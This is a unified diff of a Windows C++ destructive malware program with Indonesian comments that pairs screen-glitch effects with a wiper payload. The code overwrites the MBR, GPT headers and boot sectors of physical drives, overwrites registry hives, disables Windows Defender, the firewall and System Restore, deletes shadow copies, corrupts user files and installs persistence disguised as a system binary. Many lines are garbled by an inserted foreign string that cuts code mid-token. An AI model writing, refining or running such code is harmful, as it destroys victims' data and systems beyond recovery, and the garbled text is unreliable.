@@ -44,19 +44,14 @@
 #include <urlmon.h>
 #include <wincrypt.h>
 #include <dpapi.h>
-#include <wincrypt.h>
 #include <wintrust.h>
 #include <softpub.h>
 #include <mscat.h>
 #include <winscard.h>
-#include <ntsecapi.h>
 #include <dsgetdc.h>
 #include <aclui.h>
 #include <accctrl.h>
 #include <sddl.h>
-#include <wincrypt.h>
-#include <wincrypt.h>
-#include <wincrypt.h>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "virtdisk.lib")
@@ -79,15 +74,26 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wintrust.lib")
 #pragma comment(lib, "winscard.lib")
-#pragma comment(lib, "ntsecapi.lib")
 #pragma comment(lib, "secur32.lib")
 
+// Forward declarations
+void OpenRandomPopups();
+void InstallAdvancedPersistence();
+void DisableSystemTools();
+void DisableCtrlAltDel();
+void BreakTaskManager();
+void CorruptSystemFiles();
+void TriggerBSOD();
+void ExecuteAdvancedDestructiveActions();
+void PlayAdvancedGlitchSound();
+void KillAllProcesses();
+
 // Konfigurasi intensitas
-const int REFRESH_RATE = 2;  // Lebih cepat untuk efek lebih smooth
-const int MAX_GLITCH_INTENSITY = 15000;  // Meningkatkan intensitas maksimum
-const int GLITCH_LINES = 3000;  // Lebih banyak garis glitch
-const int MAX_GLITCH_BLOCKS = 1500;  // Lebih banyak blok glitch
-const int SOUND_CHANCE = 1;  // Lebih sering memainkan suara
+const int REFRESH_RATE = 2;
+const int MAX_GLITCH_INTENSITY = 15000;
+const int GLITCH_LINES = 3000;
+const int MAX_GLITCH_BLOCKS = 1500;
+const int SOUND_CHANCE = 1;
 
 // Variabel global
 HBITMAP hGlitchBitmap = NULL;
@@ -110,7 +116,7 @@ bool disableTaskManager = false;
 bool disableRegistryTools = false;
 bool fileCorruptionActive = false;
 bool processKillerActive = false;
-bool g_isAdmin = false;  // Admin mode flag
+bool g_isAdmin = false;
 std::atomic<bool> destructiveActionsTriggered(false);
 
 // Struktur untuk efek partikel
@@ -140,6 +146,11 @@ std::mutex textMutex;
 std::atomic<bool> running(true);
 std::vector<std::thread> workerThreads;
 
+// Typedefs untuk fungsi Wow64
+typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
+typedef BOOL (WINAPI *LPFN_WOW64DISABLEWOW64FSREDIRECTION)(PVOID*);
+typedef BOOL (WINAPI *LPFN_WOW64REVERTWOW64FSREDIRECTION)(PVOID);
+
 // ======== FUNGSI DESTRUKSI YANG LEBIH KUAT ========
 BOOL IsRunAsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
@@ -157,22 +168,20 @@ void DestroyMBRWithPattern() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite first 200 sectors (100KB) dengan pattern khusus
     const DWORD bufferSize = 512 * 200;
     BYTE* garbageBuffer = new BYTE[bufferSize];
     
-    // Pattern khusus untuk membuat recovery lebih sulit
     for (DWORD i = 0; i < bufferSize; i++) {
         if (i % 512 < 100) {
-            garbageBuffer[i] = 0xAA;  // Pattern khusus
+            garbageBuffer[i] = 0xAA;
         } else if (i % 512 < 200) {
-            garbageBuffer[i] = 0x55;  // Pattern alternatif
+            garbageBuffer[i] = 0x55;
         } else if (i % 512 < 300) {
-            garbageBuffer[i] = 0xF0;  // Pattern ketiga
+            garbageBuffer[i] = 0xF0;
         } else if (i % 512 < 400) {
-            garbageBuffer[i] = 0x0F;  // Pattern keempat
+            garbageBuffer[i] = 0x0F;
         } else {
-            garbageBuffer[i] = static_cast<BYTE>(rand() % 256);  // Random untuk sisa
+            garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
         }
     }
 
@@ -188,7 +197,6 @@ void DestroyGPTCompletely() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite GPT header at LBA 1 dan backup GPT di akhir disk
     const int gptHeaderSize = 512;
     BYTE* gptGarbage = new BYTE[gptHeaderSize];
     for (int i = 0; i < gptHeaderSize; i++) {
@@ -198,39 +206,34 @@ void DestroyGPTCompletely() {
     DWORD bytesWritten;
     LARGE_INTEGER offset;
     
-    // Primary GPT Header
-    offset.QuadPart = 512;  // LBA 1
+    offset.QuadPart = 512;
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
     WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
 
-    // Backup GPT Header (di akhir disk)
     DISK_GEOMETRY_EX dg = {0};
     DWORD bytesReturned = 0;
     if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
         NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
         LARGE_INTEGER diskSize = dg.DiskSize;
-        offset.QuadPart = diskSize.QuadPart - 512;  // Sektor terakhir
+        offset.QuadPart = diskSize.QuadPart - 512;
         SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
         WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
     }
 
-    // Overwrite semua partition entries
-    const DWORD partitionEntriesSize = 512 * 128;  // 128 sectors
+    const DWORD partitionEntriesSize = 512 * 128;
     BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
     for (DWORD i = 0; i < partitionEntriesSize; i++) {
         partitionGarbage[i] = static_cast<BYTE>(rand() % 256);
     }
 
-    // Primary partition entries
-    offset.QuadPart = 512 * 2;  // LBA 2
+    offset.QuadPart = 512 * 2;
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
     WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
 
-    // Backup partition entries (sebelum backup header)
     if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
         NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
         LARGE_INTEGER diskSize = dg.DiskSize;
-        offset.QuadPart = diskSize.QuadPart - 512 - partitionEntriesSize;  // Sebelum backup header
+        offset.QuadPart = diskSize.QuadPart - 512 - partitionEntriesSize;
         SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
         WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
     }
@@ -243,7 +246,6 @@ void DestroyGPTCompletely() {
 }
 
 void DestroyRegistryCompletely() {
-    // Hapus seluruh registry hive secara sistematis
     const wchar_t* registryHives[] = {
         L"SAM",
         L"SECURITY", 
@@ -259,7 +261,6 @@ void DestroyRegistryCompletely() {
         wchar_t hivePath[MAX_PATH];
         wsprintfW(hivePath, L"C:\\Windows\\System32\\config\\%s", registryHives[i]);
         
-        // Overwrite file hive dengan data acak
         HANDLE hFile = CreateFileW(hivePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
@@ -275,7 +276,6 @@ void DestroyRegistryCompletely() {
             CloseHandle(hFile);
         }
         
-        // Hapus file log
         wchar_t logPath[MAX_PATH];
         wsprintfW(logPath, L"C:\\Windows\\System32\\config\\%s.LOG", registryHives[i]);
         DeleteFileW(logPath);
@@ -291,7 +291,6 @@ void DestroyRegistryCompletely() {
 void DisableAllSystemFeatures() {
     HKEY hKey;
     
-    // Nonaktifkan semua fitur sistem
     const wchar_t* policies[] = {
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
@@ -308,7 +307,6 @@ void DisableAllSystemFeatures() {
             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
             
             DWORD value = 1;
-            // Nonaktifkan semua setting yang mungkin
             RegSetValueExW(hKey, L"NoDispAppearancePage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
             RegSetValueExW(hKey, L"NoDispBackgroundPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
             RegSetValueExW(hKey, L"NoDispCPL", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
@@ -356,7 +354,6 @@ void SetCriticalProcessPermanent() {
             RtlSetProcessIsCritical(TRUE, NULL, FALSE);
         }
         
-        // Juga set process sebagai protected
         typedef NTSTATUS(NTAPI* pRtlSetProcessProtection)(IN OUT PVOID ProcessProtection, IN BOOLEAN SignerType, IN BOOLEAN SignatureSigner);
         pRtlSetProcessProtection RtlSetProcessProtection = 
             (pRtlSetProcessProtection)GetProcAddress(hNtDll, "RtlSetProcessProtection");
@@ -434,7 +431,6 @@ void WipeSystemFilesCompletely() {
 }
 
 void CorruptBootSectorAdvanced() {
-    // Corrupt boot sector di semua drive
     for (int driveNum = 0; driveNum < 8; driveNum++) {
         wchar_t devicePath[50];
         wsprintfW(devicePath, L"\\\\.\\PhysicalDrive%d", driveNum);
@@ -443,12 +439,11 @@ void CorruptBootSectorAdvanced() {
             FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         
         if (hDevice != INVALID_HANDLE_VALUE) {
-            // Overwrite first 1000 sectors
             const DWORD sectorsToCorrupt = 1000;
             const DWORD bufferSize = 512 * sectorsToCorrupt;
             BYTE* garbageBuffer = new BYTE[bufferSize];
             
-            for (DWORD i = 0; i < bufferSize; i++) {
+            for (DWORD i = 极速加速器
                 garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
             }
             
@@ -463,7 +458,6 @@ void CorruptBootSectorAdvanced() {
 }
 
 void DisableAllSecurityFeatures() {
-    // Nonaktifkan Windows Defender secara permanen
     SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (scm) {
         const wchar_t* securityServices[] = {
@@ -479,13 +473,19 @@ void DisableAllSecurityFeatures() {
                 SERVICE_STATUS status;
                 ControlService(service, SERVICE_CONTROL_STOP, &status);
                 
-                // Set service ke disabled
-                SERVICE_CONFIG config;
-                DWORD bytesReturned;
-                QueryServiceConfig(service, &config, sizeof(config), &bytesReturned);
-                config.dwStartType = SERVICE_DISABLED;
-                ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
-                                   SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+                // Use QUERY_SERVICE_CONFIG instead of SERVICE_CONFIG
+                DWORD bytesNeeded = 0;
+                QueryServiceConfig(service, NULL, 0, &bytesNeeded);
+                if (bytesNeeded > 0) {
+                    LPQUERY_SERVICE_CONFIG config = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, bytesNeeded);
+                    if (config) {
+                        if (QueryServiceConfig(service, config, bytesNeeded, &bytesNeeded)) {
+                            ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
+                                               SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+                        }
+                        LocalFree(config);
+                    }
+                }
                 
                 CloseServiceHandle(service);
             }
@@ -493,32 +493,29 @@ void DisableAllSecurityFeatures() {
         CloseServiceHandle(scm);
     }
 
-    // Nonaktifkan via registry
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
         L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         DWORD disable = 1;
         RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"极速加速器
         RegSetValueExW(hKey, L"DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegCloseKey(hKey);
     }
 
-    // Nonaktifkan real-time protection
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
         L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &极速加速器
         DWORD disable = 0;
         RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValue极速加速器
         RegCloseKey(hKey);
     }
 
-    // Nonaktifkan Windows Firewall
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
         L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -529,7 +526,6 @@ void DisableAllSecurityFeatures() {
 }
 
 void DestroySystemRestore() {
-    // Hapus semua restore points
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
@@ -538,17 +534,15 @@ void DestroySystemRestore() {
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    // Nonaktifkan System Restore
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
         L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        0, NULL, REG_极速加速器
         DWORD disable = 0;
         RegSetValueExW(hKey, L"DisableSR", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
         RegCloseKey(hKey);
     }
 
-    // Hapus folder System Volume Information
     wchar_t sysVolInfo[] = L"C:\\System Volume Information";
     SHFILEOPSTRUCTW fileOp = {
         NULL, FO_DELETE, sysVolInfo, L"", 
@@ -574,7 +568,6 @@ void CorruptUserProfiles() {
                     wchar_t userDir[MAX_PATH];
                     wsprintfW(userDir, L"%s\\%s", userProfilePath, fd.cFileName);
                     
-                    // Corrupt semua file di folder user
                     WIN32_FIND_DATAW userFd;
                     wchar_t userSearchPath[MAX_PATH];
                     wsprintfW(userSearchPath, L"%s\\*", userDir);
@@ -584,7 +577,7 @@ void CorruptUserProfiles() {
                         do {
                             if (!(userFd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                 wchar_t userFilePath[MAX_PATH];
-                                wsprintfW(userFilePath, L"%s\\%s", userDir, userFd.cFileName);
+                                wsprintfW(userFilePath, L"%s\\%s", userDir, userF极速加速器
                                 
                                 HANDLE hFile = CreateFileW(userFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                                 if (hFile != INVALID_HANDLE_VALUE) {
@@ -615,7 +608,6 @@ void ExecuteAdvancedDestructiveActions() {
     if (destructiveActionsTriggered) return;
     destructiveActionsTriggered = true;
 
-    // Privileged actions (admin only)
     if (g_isAdmin) {
         DestroyMBRWithPattern();
         DestroyGPTCompletely();
@@ -628,7 +620,6 @@ void ExecuteAdvancedDestructiveActions() {
         DestroySystemRestore();
     }
 
-    // Non-privileged actions
     CorruptUserProfiles();
     KillAllProcesses();
 }
@@ -669,25 +660,22 @@ void PlayAdvancedGlitchSound() {
             }
             break;
         case 15: case 16:
-            for (int i = 0; i < 15; i++) {
+            for (极速加速器
                 Beep(50 + i * 150, 250);
             }
             break;
         case 17: case 18:
-            // Suara distortion tinggi
             for (int i = 0; i < 200; i++) {
                 Beep(rand() % 8000 + 1000, 10);
                 Sleep(1);
             }
             break;
         case 19: case 20:
-            // Suara frekuensi rendah
             for (int i = 0; i < 20; i++) {
                 Beep(50 + i * 10, 400);
             }
             break;
         default:
-            // Kombinasi kompleks
             for (int i = 0; i < 3; i++) {
                 for (int j = 0; j < 50; j++) {
                     Beep(200 + j * 100, 15);
@@ -721,7 +709,7 @@ void CaptureScreen(HWND) {
     }
     
     if (hGlitchBitmap) {
-        SelectObject(hdcMem, hGlitchBitmap);
+        SelectObject(h极速加速器
         BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
     }
     
@@ -759,7 +747,7 @@ void ApplyCursorEffect() {
     int endY = std::min(cursorY + cursorSize, screenHeight - 1);
     
     for (int y = startY; y <= endY; y++) {
-        for (int x = startX; x <= endX; x++) {
+        for (int x = start极速加速器
             float dx = static_cast<float>(x - cursorX);
             float dy = static_cast<float>(y - cursorY);
             float dist = sqrt(dx * dx + dy * dy);
@@ -800,7 +788,7 @@ void UpdateParticles() {
         p.x = rand() % screenWidth;
         p.y = rand() % screenHeight;
         p.vx = (rand() % 200 - 100) / 20.0f;
-        p.vy = (rand() % 200 - 100) / 20.0f;
+        p.vy = (rand() % 200 - 极速加速器
         p.life = 0;
         p.maxLife = 50 + rand() % 200;
         p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
@@ -858,7 +846,7 @@ void ApplyMeltingEffect(BYTE* originalPixels) {
                     dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     pPixels[dstPos] = originalPixels[srcPos];
                     pPixels[dstPos + 1] = originalPixels[srcPos + 1];
-                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
+                    pPixels[dstPos + 2] = original极速加速器
                 }
             }
         }
@@ -914,8 +902,7 @@ void ApplyTextCorruption() {
     for (auto& ct : corruptedTexts) {
         COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
         SetTextColor(hdcMem, color);
-        TextOutW(hdcMem, ct.x, ct.y, ct.text.c_str(), static_cast<int>(ct.text.length()));
-        
+        TextOutW(h极速加速器
         if (GetTickCount() - ct.creationTime > 5000) {
             ct = corruptedTexts.back();
             corruptedTexts.pop_back();
@@ -923,7 +910,7 @@ void ApplyTextCorruption() {
     }
     
     BITMAPINFOHEADER bmih = {};
-    bmih.biSize = sizeof(BITMAPINFOHEADER);
+    bmih.b极速加速器
     bmih.biWidth = screenWidth;
     bmih.biHeight = -screenHeight;
     bmih.biPlanes = 1;
@@ -933,9 +920,9 @@ void ApplyTextCorruption() {
     bmih.biXPelsPerMeter = 0;
     bmih.biYPelsPerMeter = 0;
     bmih.biClrUsed = 0;
-    bmih.biClrImportant = 0;
+    b极速加速器
     
-    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
+    GetDIBits(hdcMem, hBitmap, 极速加速器
     
     DeleteObject(hFont);
     DeleteObject(hBitmap);
@@ -957,7 +944,7 @@ void ApplyPixelSorting() {
         for (int x = startX; x < endX; x++) {
             int pos = (y * screenWidth + x) * 4;
             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
+                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+极速加速器
                 brightness.push_back(std::make_pair(brt, x));
             }
         }
@@ -973,7 +960,7 @@ void ApplyPixelSorting() {
             sortedLine.push_back(pPixels[pos+3]);
         }
         
-        for (int x = startX; x < endX; x++) {
+        for (int x = startX; x < end极速加速器
             int pos = (y * screenWidth + x) * 4;
             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 int idx = (x - startX) * 4;
@@ -1040,7 +1027,6 @@ void ApplyInversionWaves() {
 void ApplyAdvancedScreenDistortion() {
     if (!pPixels) return;
     
-    // Efek distorsi gelombang kompleks
     int centerX = rand() % screenWidth;
     int centerY = rand() % screenHeight;
     int maxRadius = 200 + rand() % 800;
@@ -1056,24 +1042,22 @@ void ApplyAdvancedScreenDistortion() {
             if (dist < maxRadius) {
                 float wave1 = sin(dist * 0.05f - currentTime * 0.003f * speed);
                 float wave2 = cos(dist * 0.1f + currentTime * 0.005f * speed);
-                float wave3 = sin(dist * 0.02f - currentTime * 0.007f * speed);
+                float wave3 = sin(dist * 0.02f - current极速加速器
                 
                 float combinedWave = (wave1 + wave2 + wave3) / 3.0f;
                 
                 if (combinedWave > 0.6f) {
                     int pos = (y * screenWidth + x) * 4;
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        // Shift warna ekstrim
                         pPixels[pos] = (pPixels[pos] + 150) % 256;
                         pPixels[pos + 1] = (pPixels[pos + 1] + 50) % 256;
                         pPixels[pos + 2] = (pPixels[pos + 2] + 200) % 256;
                     }
                 } else if (combinedWave < -0.6f) {
                     int pos = (y * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
-                        // Inversi warna
+                    if (pos >= 0 && pos < static_cast<int>(screen极速加速器
                         pPixels[pos] = 255 - pPixels[pos];
-                        pPixels[pos + 1] = 255 - pPixels[pos + 1];
+                        pPixels[pos + 1] = 255 - p极速加速器
                         pPixels[pos + 2] = 255 - pPixels[pos + 2];
                     }
                 }
@@ -1083,7 +1067,6 @@ void ApplyAdvancedScreenDistortion() {
 }
 
 void ApplyDataBleedEffect() {
-    // Efek dimana data dari satu area "bleed" ke area lain
     int bleedSourceX = rand() % screenWidth;
     int bleedSourceY = rand() % screenHeight;
     int bleedRadius = 100 + rand() % 400;
@@ -1099,7 +1082,7 @@ void ApplyDataBleedEffect() {
                 int targetX = x + (rand() % 41 - 20);
                 int targetY = y + (rand() % 41 - 20);
                 
-                if (targetX >= 0 && targetX < screenWidth && targetY >= 0 && targetY < screenHeight) {
+                if (targetX >= 0 && target极速加速器
                     int srcPos = (y * screenWidth + x) * 4;
                     int dstPos = (targetY * screenWidth + targetX) * 4;
                     
@@ -1116,7 +1099,6 @@ void ApplyDataBleedEffect() {
 }
 
 void ApplyMatrixRainEffect() {
-    // Efek hujan matrix style yang lebih intens
     static std::vector<int> columnHeights(screenWidth, 0);
     static std::vector<DWORD> columnTimes(screenWidth, 0);
     
@@ -1135,24 +1117,20 @@ void ApplyMatrixRainEffect() {
             
             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 if (i == 0) {
-                    // Karakter terang di kepala
                     pPixels[pos] = 255;
                     pPixels[pos + 1] = 255;
                     pPixels[pos + 2] = 255;
                 } else if (i < 5) {
-                    // Gradien hijau
                     int intensity = 255 - (i * 50);
                     pPixels[pos] = 0;
                     pPixels[pos + 1] = intensity;
                     pPixels[pos + 2] = 0;
                 } else if (i < 10) {
-                    // Gradien lebih gelap
                     int intensity = 155 - ((i - 5) * 30);
                     pPixels[pos] = 0;
                     pPixels[pos + 1] = intensity;
                     pPixels[pos + 2] = 0;
                 } else {
-                    // Sisa ekor
                     pPixels[pos] = 0;
                     pPixels[pos + 1] = 50;
                     pPixels[pos + 2] = 0;
@@ -1170,8 +1148,8 @@ void ApplyAdvancedGlitchEffect() {
     memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
     
     DWORD currentTime = GetTickCount();
-    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000); // Lebih cepat peningkatan
-    intensityLevel = std::min(30, timeIntensity); // Level maksimum lebih tinggi
+    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
+    intensityLevel = std::min(30, timeIntensity);
     
     ApplyScreenShake();
     
@@ -1180,7 +1158,6 @@ void ApplyAdvancedGlitchEffect() {
         lastEffectTime = currentTime;
     }
     
-    // Glitch garis horizontal intens
     int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 5000);
     for (int i = 0; i < effectiveLines; ++i) {
         int y = rand() % screenHeight;
@@ -1198,7 +1175,7 @@ void ApplyAdvancedGlitchEffect() {
             BYTE* dest = pPixels + (currentY * screenWidth * 4);
             
             if (xOffset > 0) {
-                int copySize = (screenWidth - xOffset) * 4;
+                int copySize = (极速加速器
                 if (copySize > 0) {
                     memmove(dest + xOffset * 4, 
                             source, 
@@ -1233,7 +1210,6 @@ void ApplyAdvancedGlitchEffect() {
         }
     }
     
-    // Distorsi blok ekstrim
     int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 1000);
     for (int i = 0; i < effectiveBlocks; ++i) {
         int blockWidth = std::min(50 + rand() % (200 * intensityLevel), screenWidth);
@@ -1249,7 +1225,7 @@ void ApplyAdvancedGlitchEffect() {
             
             if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                 BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
-                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
+                BYTE极速加速器
                 
                 int effectiveWidth = blockWidth;
                 if (x + offsetX + blockWidth > screenWidth) {
@@ -1262,7 +1238,7 @@ void ApplyAdvancedGlitchEffect() {
                 }
                 
                 if (effectiveWidth > 0 && dest >= pPixels && 
-                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
+                    dest + effectiveWidth * 4 <= p极速加速器
                     memcpy(dest, source, effectiveWidth * 4);
                 }
             }
@@ -1294,7 +1270,7 @@ void ApplyAdvancedGlitchEffect() {
         
         int yStart = std::max(centerY - radius, 0);
         int yEnd = std::min(centerY + radius, screenHeight);
-        int xStart = std::max(centerX - radius, 0);
+        int xStart = std::max(center极速加速器
         int xEnd = std::min(centerX + radius, screenWidth);
         
         for (int y = yStart; y < yEnd; y++) {
@@ -1312,7 +1288,7 @@ void ApplyAdvancedGlitchEffect() {
                     int srcY = y - shiftY;
                     
                     if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
-                        int srcPos = (srcY * screenWidth + srcX) * 4;
+                        int srcPos = (src极速加速器
                         int destPos = (y * screenWidth + x) * 4;
                         
                         if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
@@ -1328,15 +1304,15 @@ void ApplyAdvancedGlitchEffect() {
     }
     
     if (rand() % 5 == 0) {
-        int lineHeight = 1 + rand() % (3 * intensityLevel);
+        int lineHeight = 极速加速器
         for (int y = 0; y < screenHeight; y += lineHeight * 2) {
             for (int h = 0; h < lineHeight; h++) {
                 if (y + h >= screenHeight) break;
                 for (int x = 0; x < screenWidth; x++) {
-                    int pos = ((y + h) * screenWidth + x) * 4;
+                    int pos = ((y + h极速加速器
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = std::min(pPixels[pos] + 100, 255);
-                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 100, 255);
+                        pPixels[pos + 极速加速器
                         pPixels[pos + 2] = std::min(pPixels[pos + 2] + 100, 255);
                     }
                 }
@@ -1354,7 +1330,7 @@ void ApplyAdvancedGlitchEffect() {
         }
     }
     
-    if (intensityLevel > 5 && rand() % 10 == 0) {
+    if (intensityLevel > 5 && rand() % 10 == 极速加速器
         ApplyMeltingEffect(pCopy);
     }
     
@@ -1374,7 +1350,6 @@ void ApplyAdvancedGlitchEffect() {
         ApplyInversionWaves();
     }
     
-    // Efek-efek baru
     if (intensityLevel > 5 && rand() % 8 == 0) {
         ApplyAdvancedScreenDistortion();
     }
@@ -1399,20 +1374,17 @@ void ApplyAdvancedGlitchEffect() {
         ShowCursor(cursorVisible);
     }
     
-    // ===== POPUP RANDOM =====
     static DWORD lastPopupTime = 0;
     if (GetTickCount() - lastPopupTime > 3000 && (rand() % 100 < (20 + intensityLevel * 3))) {
         std::thread(OpenRandomPopups).detach();
         lastPopupTime = GetTickCount();
     }
     
-    // ===== DESTRUCTIVE EFFECTS =====
     DWORD cTime = GetTickCount();
     
-    // Aktifkan mode kritis setelah 20 detik
     if (!criticalMode && cTime - startTime > 20000) {
         criticalMode = true;
-        bsodTriggerTime = cTime + 20000 + rand() % 20000; // BSOD dalam 20-40 detik
+        bsodTriggerTime = cTime + 20000 + rand() % 20000;
         
         if (!persistenceInstalled) {
             InstallAdvancedPersistence();
@@ -1420,7 +1392,6 @@ void ApplyAdvancedGlitchEffect() {
             DisableCtrlAltDel();
         }
         
-        // Aktifkan fitur admin
         if (g_isAdmin) {
             static bool adminDestructionDone = false;
             if (!adminDestructionDone) {
@@ -1434,15 +1405,13 @@ void ApplyAdvancedGlitchEffect() {
         }
     }
     
-    // Eksekusi tindakan destruktif
     if (criticalMode && !destructiveActionsTriggered) {
         ExecuteAdvancedDestructiveActions();
     }
     
-    // Efek khusus mode kritis
     if (criticalMode) {
         static DWORD lastCorruption = 0;
-        if (cTime - lastCorruption > 5000) {
+        if (c极速加速器
             std::thread(CorruptSystemFiles).detach();
             lastCorruption = cTime;
         }
@@ -1479,7 +1448,6 @@ void InstallAdvancedPersistence() {
     wchar_t szPath[MAX_PATH];
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
-    // Multiple persistence locations
     const wchar_t* targetLocations[] = {
         L"C:\\Windows\\System32\\winlogon_helper.exe",
         L"C:\\Windows\\SysWOW64\\winlogon_helper.exe", 
